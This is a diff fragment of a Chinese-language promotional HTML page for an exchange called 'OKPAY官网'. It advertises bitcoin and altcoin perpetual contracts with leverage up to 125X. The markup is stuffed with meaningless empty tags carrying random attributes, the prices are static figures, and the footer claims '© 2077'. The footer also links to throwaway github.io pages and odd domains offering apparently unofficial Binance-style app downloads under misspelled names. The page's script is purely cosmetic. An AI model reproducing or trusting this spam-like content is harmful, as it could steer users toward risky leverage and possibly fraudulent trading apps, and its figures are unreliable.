+                        5000BTC保险基金，穿仓零分摊。冷热钱包分离，98%资产离线存储，
+                        为您的<span class="gc9278 highlight">比特币合约交易</span>和<span class="ha9395 highlight">以太坊杠杆</span>仓位提供银行级安全保障。
+                    </p></article><tt dropzone="6313d8"></tt><var date-time="1ad757"></var><area dir="ce45b1"></area><article class="i9d4f3 holo-card"><span class="jb0f0f holo-icon">📊</span><h3>专业交易工具</h3><p>
+                        支持<span class="kca818 highlight">合约网格</span>、<span class="lebbd9 highlight">量化策略</span>、一键跟单。
+                        TradingView深度集成，技术指标全覆盖。API高频交易支持，满足机构级<span class="m58119 highlight">炒币</span>需求。
+                    </p></article><map lang="f37629"></map><bdo draggable="3907df"></bdo><dfn dropzone="8465d0"></dfn><article class="nbdaa0 holo-card"><span class="o7f180 holo-icon">🌐</span><h3>全球深度聚合</h3><p>
+                        连接Binance、OKX、Coinbase等顶级交易所流动性，<span class="p54df3 highlight">虚拟货币期货</span>
+                        深度全球领先。支持USDT本位、币本位、USDC全模式，满足多样化<span class="q8d078 highlight">杠杆交易</span>需求。
+                    </p></article></div></section><font date-time="e703d9"></font><ins dir="1dd4a3"></ins><small lang="cc12dc"></small><section class="raeeb5 markets-section"><sup draggable="e24710"></sup><time dropzone="89b7dc"></time><tt date-time="692ffc"></tt><div dropzone="bd26f3" class="s04710 section-header"><h2>OKPAY官网热门合约 // HOT_CONTRACTS</h2><p>高流动性虚拟货币合约交易对，支持全仓/逐仓模式</p></div><var dir="941bac"></var><area lang="0f828e"></area><map draggable="55fe07"></map><table date-time="58684a" class="tc531d neon-table"><thead><tr><th>交易对 // PAIR</th><th>最新价 // PRICE</th><th>24H涨跌 // CHANGE</th><th>24H额 // VOLUME</th><th>最高杠杆 // MAX</th></tr></thead><tbody><tr><td><bdo dropzone="0ebd5f"></bdo><dfn date-time="de331e"></dfn><font dir="2550a8"></font><div dir="0a84f4" class="u52dfc pair-name">BTC/USDT</div><ins lang="27271c"></ins><small draggable="0aaff2"></small><sup dropzone="ee5c2a"></sup><div lang="afb5b5" class="v65806 pair-sub">比特币永续合约</div></td><td class="w9daa7 price-up">67,234.50</td><td class="xe7284 price-up">+5.23%</td><td>$1.2B</td><td><span class="y5355a leverage-tag">125X</span></td></tr><tr><td><time date-time="dca869"></time><tt dir="d54901"></tt><var lang="db6770"></var><div draggable="17774d" class="z56fcb pair-name">ETH/USDT</div><area draggable="8ee66c"></area><map dropzone="7e0425"></map><bdo date-time="32a53d"></bdo><div dropzone="39b8fa" class="a27de0 pair-sub">以太坊永续合约</div></td><td class="b98934 price-down">3,456.78</td><td class="cb3638 price-down">-2.15%</td><td>$890M</td><td><span class="df8b44 leverage-tag">125X</span></td></tr><tr><td><dfn dir="283660"></dfn><font lang="712fbf"></font><ins draggable="3d49a1"></ins><div date-time="669b34" class="e2c940 pair-name">SOL/USDT</div><small dropzone="940b82"></small><sup date-time="1dbb61"></sup><time dir="6f60fd"></time><div dir="52413f" class="f3960e pair-sub">索拉纳永续合约</div></td><td class="g8c595 price-up">178.90</td><td class="h5f147 price-up">+12.80%</td><td>$234M</td><td><span class="i56657 leverage-tag">50X</span></td></tr><tr><td><tt lang="b0e5b4"></tt><var draggable="a21e3c"></var><area dropzone="756ea6"></area><div lang="01a390" class="j82536 pair-name">XRP/USDT</div><map date-time="61f0c8"></map><bdo dir="bcd2cd"></bdo><dfn lang="d522c9"></dfn><div draggable="287dc0" class="kd6965 pair-sub">瑞波币永续合约</div></td><td class="l78e4e price-up">0.6234</td><td class="m7dc9c price-up">+8.45%</td><td>$156M</td><td><span class="n2096f leverage-tag">50X</span></td></tr><tr><td><font draggable="c04abd"></font><ins dropzone="9ac65c"></ins><small date-time="26157e"></small><div dropzone="83282a" class="o1caad pair-name">DOGE/USDT</div><sup dir="15db47"></sup><time lang="4b62bd"></time><tt draggable="1362fc"></tt><div date-time="fb2ead" class="pc24e9 pair-sub">狗狗币永续合约</div></td><td class="qea5d6 price-down">0.1234</td><td class="r8de22 price-down">-1.20%</td><td>$89M</td><td><span class="s9866f leverage-tag">25X</span></td></tr></tbody></table></section></main><footer><var dropzone="157256"></var><area date-time="e95fdf"></area><map dir="b2ec5f"></map><div dir="0c7eb8" class="ta558a footer-grid"><bdo lang="c920c4"></bdo><dfn draggable="08fc0a"></dfn><font dropzone="ca5cb2"></font><div lang="9ed2b1" class="ua0747 footer-col"><h4>合约交易</h4><ul><li><a href="/btc-perpetual">BTC永续合约</a></li><li><a href="/eth-perpetual">ETH永续合约</a></li><li><a href="/quarterly-futures">交割合约</a></li><li><a href="/coin-margin">币本位合约</a></li></ul></div><ins date-time="995307"></ins><small dir="099d51"></small><sup lang="7dd1ca"></sup><div draggable="88eef2" class="v019d6 footer-col"><h4>杠杆产品</h4><ul><li><a href="/isolated-margin">逐仓杠杆</a></li><li><a href="/cross-margin">全仓杠杆</a></li><li><a href="/leverage-tokens">杠杆代币</a></li><li><a href="/margin-trading">现货杠杆</a></li></ul></div><time draggable="dd365a"></time><tt dropzone="ac0e07"></tt><var date-time="0d6014"></var><div dropzone="02136b" class="w0376b footer-col"><h4>衍生品</h4><ul><li><a href="/options">期权交易</a></li><li><a href="/volatility">波动率指数</a></li><li><a href="/funding-rate">资金费率</a></li><li><a href="/insurance-fund">保险基金</a></li></ul></div><area dir="d5bbb6"></area><map lang="d5b9b4"></map><bdo draggable="9f8efd"></bdo><div date-time="8081c8" class="x0353e footer-col"><h4>交易工具</h4><ul><li><a href="/api">API文档</a></li><li><a href="/sdk">量化SDK</a></li><li><a href="/calculator">收益计算</a></li><li><a href="/testnet">模拟交易</a></li></ul></div></div><dfn dropzone="09b0cc"></dfn><font date-time="dcce84"></font><ins dir="70e207"></ins><div dir="d64ed5" class="y2fb45 risk-warning">
+            [WARNING] OKPAY官网虚拟货币合约交易涉及高风险，125倍杠杆可能导致本金全部损失。
+            比特币、以太坊价格波动剧烈，请充分了解合约交易机制后谨慎参与。
+            本页面仅供技术展示，不构成投资建议。
+        </div><small lang="e2f31c"></small><sup draggable="23c673"></sup><time dropzone="f3a9d0"></time><div lang="f1cdaf" class="zc1e72 copyright"><p>© 2077 OKPAY官网</p><p style="margin-top: 10px;">TERMINAL_ID: 0xFF00 // BLOCK_HEIGHT: 884,239</p></div><tt date-time="894fe9"></tt><var dir="f21e2f"></var><area lang="d0c6d6"></area><div draggable="4ac82d" class="a3c870 footer_bottom"><p class="b90a9e muted"><a href="/">OKPAY官网</a><a href="https://youngjessica10.github.io/" target="_blank">BinanceAPP如何设置成中文</a><a href="http://j67562.oyiiguanwangxiazai.com.cn/" target="_blank">毕安APP官网</a><a href="https://rosemichael657.github.io/" target="_blank">安币如何充值</a><a href="https://perrynancy430.github.io/" target="_blank">安币binance</a><a href="https://williamsdiana354.github.io/" target="_blank">u交易平台下载</a><a href="http://7g.dgxky.com/" target="_blank">BNAPP官方下载</a><a href="https://bartonjulie157.github.io/" target="_blank">大门app官方下载</a><a href="https://mitchelldavid443.github.io/" target="_blank">oyi交易所</a></p></div></footer><script>
+        // 随机故障效果
+        setInterval(() => {
+            const glitchTexts = document.querySelectorAll('.glitch-text');
+            const randomText = glitchTexts[Math.floor(Math.random() * glitchTexts.length)];
+            randomText.style.animation = 'none';
+            setTimeout(() => {
+                randomText.style.animation = '';
+            }, 100);
+        }, 5000);
+
+        // 终端数据动态更新
+        function updateTerminal() {
+            const values = document.querySelectorAll('.terminal-value');
+            values.forEach(val => {
+                if (Math.random() > 0.7) {
+                    val.style.opacity = '0.5';
+                    setTimeout(() => {
+                        val.style.opacity = '1';
+                    }, 100);
+                }
+            });
+        }
+        setInterval(updateTerminal, 2000);
+
+        // 鼠标跟随视差
+        document.addEventListener('mousemove', (e) => {
+            const shapes = document.querySelectorAll('.shape');
+            const x = e.clientX / window.innerWidth;
+            const y = e.clientY / window.innerHeight;
+            
+            shapes.forEach((shape, index) => {
+                const speed = (index + 1) * 20;
+                shape.style.transform = `translate(${x * speed}px, ${y * speed}px) rotate(${index * 45}deg)`;
+            });
+        });
+    </script></body></html>
